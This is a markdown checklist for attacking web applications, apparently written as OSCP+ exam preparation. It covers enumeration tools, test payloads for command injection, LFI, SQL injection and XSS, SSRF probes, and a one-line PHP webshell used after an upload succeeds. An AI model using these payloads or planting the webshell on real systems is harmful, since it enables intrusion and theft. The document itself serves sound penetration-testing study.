# Web Enumeration & Exploitation

## Purpose

This file provides a structured workflow for attacking web applications during OSCP+.

Core rules:

* Enumerate before exploiting
* Map attack surface fully
* Test inputs systematically
* Focus on common, reliable vulnerabilities

---

## 0. Initial Recon

### Identify Technology

* View page source
* Check headers:

```bash
curl -I http://<IP>
```

* Use:

```bash
whatweb http://<IP>
```

Look for:

* PHP / ASP / JSP
* Apache / Nginx / IIS
* Frameworks (Laravel, Django, etc.)
* JavaScript libraries
* CMS (WordPress, Joomla)

---

## 1. Directory & Endpoint Discovery

### Gobuster

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

### Dirsearch

```bash
dirsearch -u http://<IP>
```

### FFUF

```bash
ffuf -u http://<IP>/FUZZ -w wordlist.txt
```

### Extensions to try:

* .php
* .txt
* .bak
* .old
* .zip

---

### Look for:

* admin panels
* login pages
* upload endpoints
* APIs
* config files
* backups

---

## 2. Map Attack Surface

Identify:

* GET parameters
* POST parameters
* File uploads
* Authentication forms
* Cookies / sessions
* API endpoints

Use Burp Suite to intercept and modify requests.

---

## 3. Authentication Testing

Try:

* Default credentials
* Weak credentials
* Username enumeration
* Password reuse

Test:

* login bypass
* parameter manipulation

---

## 4. Input Testing (Core Phase)

For every input field, test:

---

## 4.1 Command Injection

Test:

```bash
; id
&& id
| id
`id`
```

Windows:

```bash
& whoami
```

---

## 4.2 File Inclusion (LFI/RFI)

Test:

```bash
?page=../../../../etc/passwd
?page=../../../../windows/win.ini
```

Try:

* URL encoding
* double encoding
* null byte (if applicable)

---

## 4.3 SQL Injection

Test:

```sql
' OR 1=1 --
```

Look for:

* errors
* login bypass
* data leakage

Use:

```bash
sqlmap -u "http://<IP>/page?id=1" --batch
```

---

## 4.4 File Upload Vulnerabilities

Try uploading:

* .php
* .php.jpg
* .phtml

Check:

* execution
* storage location
* accessible URL

---

## 4.5 XSS (Lower Priority)

Test:

```html
<script>alert(1)</script>
```

Useful for:

* cookie theft
* session hijacking

---

## 4.6 SSRF

Test:

```bash
http://127.0.0.1
http://localhost
```

Look for:

* internal services
* metadata endpoints

---

## 5. Directory Traversal

```bash
../../../../etc/passwd
```

Try variations:

* encoded
* double encoded

---

## 6. Misconfigurations

Look for:

* exposed .git
* exposed backups
* debug endpoints
* verbose errors
* default pages

---

## 7. Credential Discovery

Look in:

* source code
* JavaScript files
* config files
* backup files

---

## 8. Webshells

If upload works:

### PHP shell

```php
<?php system($_GET['cmd']); ?>
```

Access:

```bash
http://<IP>/shell.php?cmd=id
```

---

## 9. Reverse Shell via Web

Use:

* PHP reverse shell
* command injection

---

## 10. Post-Exploitation

Once shell is obtained:

* Stabilize shell
* Identify user
* Check privileges
* Run privesc checklist

---

## 11. Pivot Opportunities

Look for:

* database credentials
* internal services
* API keys
* reused credentials

---

## 12. If Stuck

RESET:

* Try different wordlists
* Re-map endpoints
* Check hidden parameters
* Review Burp history
* Re-test inputs

---

## 13. Mental Model

* Inputs are attack surface
* Every parameter is a target
* File uploads are high value
* Misconfigurations win more than exploits

---

## 14. Golden Rules

* Never trust one test result
* Always try multiple payloads
* Always check source code
* Always look for credentials
